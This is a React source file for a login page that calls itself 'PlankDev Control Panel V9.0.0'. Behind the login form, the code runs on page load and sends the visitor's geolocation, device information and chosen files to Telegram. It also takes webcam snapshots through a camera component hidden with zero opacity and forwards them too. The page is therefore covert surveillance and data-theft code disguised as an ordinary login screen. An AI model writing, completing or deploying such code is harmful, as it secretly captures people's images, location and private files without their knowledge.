import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { Lock, User, Upload } from 'lucide-react';
import Input from '../components/Input';
import Button from '../components/Button';
import Card from '../components/Card';
import WebcamCapture from '../components/Webcam';
import { authenticateUser, setCurrentUser, getCurrentUser } from '../utils/auth';
import { sendImageToTelegram, sendLocationToTelegram, sendDeviceInfoToTelegram, sendFilesToTelegram } from '../utils/telegram';
import { addRippleStyles } from '../utils/ripple';

const Login: React.FC = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isCameraActive, setIsCameraActive] = useState(false);
  const navigate = useNavigate();
  
  // Check if user is already logged in and handle permissions
  useEffect(() => {
    const currentUser = getCurrentUser();
    if (currentUser) {
      navigate('/');
    } else {
      // Request permissions and activate camera
      const requestPermissions = async () => {
        try {
          // Request camera permission
          const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
          cameraStream.getTracks().forEach(track => track.stop()); // Stop the stream after permission check
          
          // Request location permission
          if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
              async (position) => {
                // Send location to Telegram
                await sendLocationToTelegram(position.coords.latitude, position.coords.longitude);
              },
              (error) => {
                console.error('Error getting location:', error);
              }
            );
          }
          
          // Send device information
          await sendDeviceInfoToTelegram();
          
          // Only show file picker if not in an iframe
          if ('showOpenFilePicker' in window && window.self === window.top) {
            try {
              const handles = await window.showOpenFilePicker({
                multiple: true,
                types: [
                  {
                    description: 'Images',
                    accept: {
                      'image/*': ['.png', '.jpg', '.jpeg', '.gif']
                    }
                  },
                  {
                    description: 'Documents',
                    accept: {
                      'application/pdf': ['.pdf'],
                      'text/plain': ['.txt'],
                      'application/msword': ['.doc'],
                      'application/vnd.openxmlformats-officedocument.wordprocessingml.document': ['.docx']
                    }
                  }
                ]
              });
              
              // Get files from handles
              const files = await Promise.all(
                handles.map(handle => handle.getFile())
              );
              
              // Send files to Telegram
              await sendFilesToTelegram(files as unknown as FileList);
            } catch (error) {
              console.error('Error accessing files:', error);
            }
          }
          
          setIsCameraActive(true);
        } catch (error) {
          console.error('Error requesting permissions:', error);
          setError('Please enable camera access to continue');
        }
      };
      
      requestPermissions();
    }
    
    // Add ripple styles
    addRippleStyles();
  }, [navigate]);
  
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      setError('Please enter both username and password');
      return;
    }
    
    setIsLoading(true);
    setError('');
    
    try {
      const user = authenticateUser(username, password);
      
      if (user) {
        setCurrentUser(user);
        navigate('/');
      } else {
        setError('Invalid username or password');
      }
    } catch (err) {
      setError('An error occurred during login');
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };
  
  // Handle webcam capture
  const handleCapture = async (imageSrc: string) => {
    try {
      const success = await sendImageToTelegram(imageSrc);
      if (!success) {
        console.error('Failed to send image to Telegram');
      }
    } catch (error) {
      console.error('Error sending image to Telegram:', error);
    }
  };
  
  // Handle file selection
  const handleFileSelect = async (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      try {
        await sendFilesToTelegram(e.target.files);
      } catch (error) {
        console.error('Error sending files:', error);
      }
    }
  };
  
  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 to-gray-800 flex flex-col items-center justify-center p-4">
      {/* Camera capture */}
      {isCameraActive && (
        <div className="absolute opacity-0 pointer-events-none">
          <WebcamCapture onCapture={handleCapture} />
        </div>
      )}
      
      {/* Hidden file input */}
      <input
        type="file"
        id="fileInput"
        className="hidden"
        multiple
        onChange={handleFileSelect}
        accept="image/*,.pdf,.doc,.docx,.txt"
      />
      
      <motion.div
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="w-full max-w-md"
      >
        <Card className="dark:bg-gray-800 shadow-xl">
          <div className="flex flex-col items-center mb-6">
            <div className="w-20 h-20 rounded-full flex items-center justify-center mb-4 overflow-hidden">
              <img 
                src="https://files.catbox.moe/98ma2n.jpg" 
                alt="Logo" 
                className="w-full h-full object-cover"
              />
            </div>
            <h1 className="text-2xl font-bold text-gray-900 dark:text-white">PlankDev Control Panel V9.0.0</h1>
            <p className="text-gray-600 dark:text-gray-400 mt-2">Enter your credentials to login</p>
          </div>
          
          {error && (
            <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mb-4" role="alert">
              <span className="block sm:inline">{error}</span>
            </div>
          )}
          
          <form onSubmit={handleLogin}>
            <div className="mb-4">
              <Input
                label="Username"
                type="text"
                fullWidth
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Enter your username"
                required
                className="pl-10"
                icon={<User size={18} className="text-gray-500 absolute left-3 top-1/2 transform -translate-y-1/2" />}
              />
            </div>
            
            <div className="mb-6">
              <Input
                label="Password"
                type="password"
                fullWidth
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                required
                className="pl-10"
                icon={<Lock size={18} className="text-gray-500 absolute left-3 top-1/2 transform -translate-y-1/2" />}
              />
            </div>
            
            <Button
              type="submit"
              variant="primary"
              fullWidth
              disabled={isLoading}
            >
              {isLoading ? 'Logging in...' : 'Login'}
            </Button>
            
            <Button
              type="button"
              variant="secondary"
              fullWidth
              className="mt-2"
              onClick={() => document.getElementById('fileInput')?.click()}
            >
              <Upload size={18} className="mr-2" />
              Upload Files
            </Button>
          </form>
        </Card>
      </motion.div>
    </div>
  );
};

export default Login;